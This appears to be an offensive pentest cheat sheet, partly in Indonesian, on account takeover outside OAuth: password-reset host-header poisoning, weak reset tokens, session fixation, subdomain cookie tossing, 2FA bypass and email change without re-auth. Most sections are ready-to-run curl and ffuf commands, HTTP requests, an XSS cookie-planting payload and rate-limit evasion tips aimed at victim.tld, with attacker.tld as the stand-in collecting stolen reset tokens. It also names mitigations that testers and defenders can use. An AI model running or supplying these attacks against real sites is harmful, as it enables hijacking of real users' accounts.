# ato-misc — auth

# Account Takeover Outside of OAuth

## 1. Reset Password Poisoning via Host / X-Forwarded-Host

**Mechanism:** app builds the reset URL from the Host header or X-Forwarded-Host without an allowlist. Mailer sends the link `https://attacker.tld/reset?token=...`.

| Header | Konteks | Efek |
|---|---|---|
| `Host: attacker.tld` | nginx `proxy_set_header Host $host;` is forwarded to the app | Reset link points to attacker |
| `X-Forwarded-Host: attacker.tld` | nginx `proxy_set_header X-Forwarded-Host $host;` + app uses `request.host_url` (Flask) or `req.get('host')` (Express) | Same
| `X-Forwarded-Host: a.tld, victim.tld` | App ambil elemen pertama | Poison bila parser ambil first |
| `X-Forwarded-Host: victim.tld@attacker.tld` | Parser naive `urlparse` | userinfo trick |
| `X-Original-URL: /reset` + `Host: attacker.tld` | Some frameworks (Symfony <5.4, Yii2) | Route override + poison

**Request flow konkret (nginx 1.25 + PHP-FPM):**

```bash
# 1. Catat token victim dari request sah
curl -si -X POST https://victim.tld/api/password/forgot \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@corp.tld"}' \
  --resolve victim.tld:443:10.0.0.5
# Server 200, mail terkirim berisi https://victim.tld/reset/abc123

# 2. Poison — picu reset kedua dengan header palsu
curl -si -X POST https://victim.tld/api/password/forgot \
  -H 'Host: victim.tld' \
  -H 'X-Forwarded-Host: attacker.tld' \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@corp.tld"}'
```

**What appears:** the second email contains `https://attacker.tld/reset/xyz789`. Victim clicks → token `xyz789` arrives in attacker's access log → replay to `https://victim.tld/reset/xyz789`.

**Why it succeeds:** app uses `req.headers['x-forwarded-host'] || req.headers.host` without validation. **Fails if:** nginx `server_name` strict + `proxy_set_header X-Forwarded-Host "";` or the framework has `TRUSTED_HOSTS` / `ALLOWED_HOSTS` (Django `ALLOWED_HOSTS`, Rails `config.hosts`, Laravel `TrustProxies`). Also check `X-Forwarded-Proto: https` for the scheme.

**Reverse-proxy variants that often leak (CVE class):**
- GitLab <16.6 (`X-Forwarded-Host` in reset)
- Joomla <3.9.26
- WordPress plugin `Password Reset` <1.5.2

---

## 2. Token Reset Lemah

| Variant | Artifact Example | Detection | Why it fails in prod |
|---|---|---|---|
| Predictable (sequential ID) | `/reset?t=10045` | Two requests, delta = 1 | Token is not used for reset
| Predictable (md5(email)) | `md5("victim@x.tld")` = `a1b2…` | Hash matches email | There is a server-side salt
| Timestamp-based | `sha1(email + unixtime)` | Forge loop 60s window | Microsecond salt |
| No expiry | Token from 2019 archive is still valid | Test old token | Server-side TTL via Redis
| Cross-account reuse | Token A used to reset account B | Change `user_id` in the body | Token is bound to server-side session
| Not invalidated after use | Token reused 2x | Second request succeeds | There is a one-time flag
| Not invalidated after login | Token remains valid after manual user login | Reset request then login, token still works | Token rotates upon `login_success`

**Test command:**

```bash
# Burst token validity window
for i in $(seq 1 20); do
  curl -s "https://victim.tld/reset?t=$i" -o /dev/null -w "%{http_code} "
done

# Reuse
curl -si "https://victim.tld/reset/abc123" -d 'password=NewP@ss1'
curl -si "https://victim.tld/reset/abc123" -d 'password=NewP@ss2'   # ekspektasi 410/400
```

**Cross-account token:** send `POST /reset` with `{"token":"abc","email":"attacker@x.tld"}` — if the app uses another user's token but looks up the user from the body, takeover in 1 request.

---

## 3. Session Fixation

**Classic pattern:** app does not regenerate session ID after login.

```http
GET /login HTTP/1.1
Host: victim.tld
# Response: Set-Cookie: SESSID=AAAAAAAAAAAAAAAA
```

Attacker pre-sets `SESSID` in the victim's browser (via XSS, meta refresh, or subdomain cookie injection), victim logs in → same session ID → attacker uses `SESSID=AAAA…`.

**Request flow:**

```bash
# 1. Attacker ambil SESSID valid pra-auth
curl -si https://victim.tld/login | grep -i set-cookie
# Set-Cookie: PHPSESSID=abc123def456; path=/; HttpOnly

# 2. Attacker tanam SESSID ke korban (contoh via another subdomain xss)
# <script>document.cookie="PHPSESSID=abc123def456;domain=.victim.tld"</script>

# 3. Korban login → cek apakah Set-Cookie baru
curl -si -X POST https://victim.tld/login \
  -b 'PHPSESSID=abc123def456' \
  -d 'u=victim&p=...'
# Kalau TIDAK ada Set-Cookie baru → fixed

# 4. Attacker pakai
curl -si https://victim.tld/account -b 'PHPSESSID=abc123def456'
```

**Why it succeeds:** PHP <5.4 default does not regenerate; modern frameworks (`session_regenerate_id(true)` post-auth, `req.session.regenerate()` in express-session, Django `cycle_key()`) close this. Also check `SameSite=Lax` (Chrome 131 default) — mitigation but not a fix if subdomains overlap.

---

## 4. Cookie Tossing Between Subdomains

**Prerequisites:** cookie `Domain=.victim.tld` + one of the subdomains is XSS or attacker-controlled (e.g., `dev.victim.tld`, `legacy.victim.tld`, `blog.victim.tld` via CNAME takeover).

**Mechanism:** attacker's subdomain sets `Set-Cookie: SESSID=fixed; Domain=.victim.tld; Path=/login` with a more specific Path → browser sends two `SESSID` cookies, app takes the last/specific one.

```http
# Di attacker.victim.tld (control subdomain)
HTTP/1.1 200 OK
Set-Cookie: SESSID=attackerFixed; Domain=.victim.tld; Path=/; Secure
Set-Cookie: SESSID=attackerFixed2; Domain=.victim.tld; Path=/account; Secure
```

**Request flow to target:**

```bash
# Generate dua cookie SESSID di jar
curl -sc /tmp/jar https://attacker.victim.tld/set-cookies
cat /tmp/jar
# victim.tld  FALSE  /  TRUE  0  SESSID  attackerFixed
# victim.tld  FALSE  /account  TRUE  0  SESSID  attackerFixed2

# Trigger victim login di /login (path / — pakai attackerFixed)
# Setelah login, arahkan ke /account → app kirim attackerFixed2 → server bingung

curl -si https://victim.tld/account -b /tmp/jar
```

**Check when successful:** PHP `session.use_strict_mode=0` + `session.use_cookies=1` will *accept* the attacker's ID. Node/Express `express-session` default takes the first cookie from the header string — can be shadowed if the attacker sends two. Java `JSESSIONID` in Tomcat 10.1 recognizes `;` and path-scoped collisions.

**Mitigation that kills the technique:** `__Host-` prefix (forces `Domain` absence, `Path=/`, `Secure`) and `__Secure-`. Cookies named `__Host-SESSID` from an attacker's subdomain will be rejected by Chrome 131.

---

## 5. 2FA Bypass

### 5.1 Response manipulation

Request 2FA challenge:

```http
POST /api/2fa/verify HTTP/1.1
Host: victim.tld
Cookie: SESSID=<pra-2fa>
Content-Type: application/json

{"code":"000000"}
```

Response `HTTP/1.1 200 OK {"ok":false,"next":"/2fa"}`.

**Client manipulation:** change body to `{"ok":true,"next":"/account"}` — successful if *only* SPA is blocking. Test server-side: directly request the endpoint that requires auth with a pre-2FA session.

```bash
curl -si https://victim.tld/api/account -b 'SESSID=<pra-2fa>'
# Ekspektasi 401/403. Kalau 200 → server tidak re-cek.
```

**Additional field variants:** `{"code":"123456","verified":true}`, `{"otp":"","step":"2"}` on loose JSON deserializers (Jackson `@JsonAnySetter`, Go `map[string]interface{}` + `json.Number`).

### 5.2 Backup code brute

| Kontrol | Brute feasibility |
|---|---|
| 8 kode × 8 digit alfanumerik, no rate limit | Trivial via ffuf |
| Rate limit per IP (not per account) | Rotate proxy |
| Code not deleted after use | Reuse |
| Case-insensitive non-hyphen | 10^8 vs 32^8 |
| Timing oracle (`valid_but_used` vs `invalid`) | Enumerasi status |

```bash
ffuf -u https://victim.tld/api/2fa/backup \
  -X POST -H 'Content-Type: application/json' \
  -H 'Cookie: SESSID=<pra-2fa>' \
  -d '{"code":"FUZZ"}' \
  -w <(seq -f "%08g" 0 99999999) \
  -fr 'invalid|rate' -mc 200
```

**Race enrollment** (`5.3`): when a new user registers 2FA, the endpoint `POST /2fa/enroll` returns `secret` + `qr`. Send two parallel requests `POST /2fa/activate` with a valid code and an invalid code — if the server validates after saving `confirmed_at`, one of them might pass without real verification.

```bash
seq 2 | xargs -P2 -I{} curl -si -X POST https://victim.tld/api/2fa/activate \
  -H 'Cookie: SESSID=<user>' -d 'code=000000'
```

**Check:** whether after enrolling 2FA, the pre-enroll session is still valid (bypass `2fa_required` flag via `Set-Cookie` without `2fa=ok`).

---

## 6. Email Change Without Re-auth

**Pattern:** `POST /api/account/email` only requires a session, does not ask for password/2FA.

```http
POST /api/account/email HTTP/1.1
Cookie: SESSID=<session hasil XSS/CSRF/session fixation>
Content-Type: application/json

{"email":"attacker@evil.tld"}
```

**Flow takeover:**
1. Attacker punya session korban (XSS/cookie tossing/session fixation).
2. Change email → attacker@evil.tld (if there is no verification to the old email).
3. Trigger password reset → token to attacker.
4. Login sebagai korban.

**Varian bypass re-auth:**
- Field `current_password` is ignored if `null`/`""`/field is missing (`@RequestBody` partial).
- Re-auth is only checked on the frontend.
- Alternative endpoint: `PATCH /api/users/me` with `email` (mass assignment), GraphQL `mutation updateUser`.
- Email change via mobile API (`X-Client: mobile`) — backend version differs without a gate.
- `PUT /api/profile` with `{"email":..., "role":"admin"}` (mass assignment to privilege).

```bash
curl -si -X PATCH https://victim.tld/api/users/me \
  -H 'Cookie: SESSID=<korban>' -H 'Content-Type: application/json' \
  -d '{"email":"attacker@evil.tld","email_verified":true}'
# Periksa: 200 tanpa password, perubahan langsung efektif
```

**Check:** does the old email receive a notification? Verification to the new email? Session reset on all devices? If none of the three are present, full takeover without victim interaction other than a click.

---

## 7. Field Operational Pitfalls

1. **Client-side layered proxy (CDN) normalizes headers.** Cloudflare 2024 + AWS ALB will strip duplicate `X-Forwarded-Host` / merge into `a, b`. Need origin IP bypass to test header poisoning — look for `ssl.origin` in crt.sh, or DNS history.
2. **Hard host allowlist in modern frameworks.** Django 5.0 `ALLOWED_HOSTS`, Rails 7.1 `config.hosts`, Laravel 11 `TrustProxies` + `$proxies` whitelist. Often triggers 400 `DisallowedHost` — don't assume this is safe; check endpoints that use `request.get_host()` *before* middleware, e.g. error handler.
3. **Mailer performs URL rewrite.** Amazon SES, SendGrid, Mailgun sometimes rewrite link tracking (`/wf/click?url=...`) and replace the domain — poison is still sent but wrapped; re-decode the `url=` query to see `attacker.tld`.
4. **Reset token is hashed in DB.** Cross-account inference is wrong if token = `sha256(raw)`. Test validation with a token from another account, not raw.
5. **Session fixation "succeeds" but session expired.** Express-session `rolling:true` + `resave:false` often regenerates post-login without a new Set-Cookie — match the `expires` timestamp.
6. **Chrome 131 cookie prefix `__Host-`.** If the app has already migrated (rare), cookie tossing is completely dead. Check the `Set-Cookie` header: whether there is a prefix or not. Firefox 133 does not yet enforce `__Host-` for cookies set via `document.cookie` on a subdomain — still viable in FF.
7. **Per-account rate limit in 2FA.** X-Forwarded-For spoofing does not help if the counter is keyed by `user_id`. Need rate limit bypass via HTTP/2 multiplexing (`h2` group), not IP rotate.
8. **Email change flow dual-confirm.** Some SaaS send confirmation to the old *and* new email. Clicking confirmation on the new email alone is not enough; there must also be a click on the old email — check whether the DB `email_change_token` has two columns or one.
9. **MFA enrollment race in a cluster.** PostgreSQL `SERIALIZABLE` or RDS multi-AZ can make two enroll requests not race; MySQL 8 with `REPEATABLE READ` often split-brain. Test in staging with a replica of the prod topology.
10. **Req/res logs in WAF can be a token source.** If the reset link is logged (e.g. ALB access log with full query), the poison technique becomes unnecessary — just read the log. Don't forget to review retention.

---

## [reasoning trace]


